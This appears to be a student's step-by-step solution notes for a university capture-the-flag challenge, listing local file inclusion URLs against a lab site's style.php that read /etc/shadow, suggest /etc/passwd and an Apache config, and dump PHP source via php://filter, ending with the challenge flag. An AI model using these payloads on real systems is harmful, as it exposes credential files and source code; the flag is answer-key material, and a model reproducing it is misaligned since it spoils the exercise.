@@ -1,0 +1,21 @@
+step 1:
+http://assignment-dusty-rose.unimelb.life/style.php?%20css_file=dashboard.php
+
+step 2:
+/*try"/etc/shadow" "/etc/passwd" "/usr/local/app/apache2/conf/httpd.conf"*/
+http://assignment-dusty-rose.unimelb.life/style.php?%20css_file=/etc/shadow
+
+
+step 3:
+http://assignment-dusty-rose.unimelb.life/style.php?css_file=php://filter/convert.base64-encode/resource=style.php
+##encode of style.php, the decode of style.php already save in the /flag1 folder
+
+step4: 
+http://assignment-dusty-rose.unimelb.life/style.php?css_file=php://filter/convert.base64-encode/resource=login.php
+http://assignment-dusty-rose.unimelb.life/style.php?css_file=php://filter/convert.base64-encode/resource=dashboard.php
+http://assignment-dusty-rose.unimelb.life/style.php?css_file=php://filter/convert.base64-encode/resource=profile.php
+## the decode file save in the /flag1 folder.
+
+step5：
+http://assignment-dusty-rose.unimelb.life/style.php?css_file=php://filter/convert.base64-encode/resource=sober.php
+Challenge 1: LFI: FLAG{The_deepeR_YoU_Dig,_the_m0re_GOLD_you'll_find!}
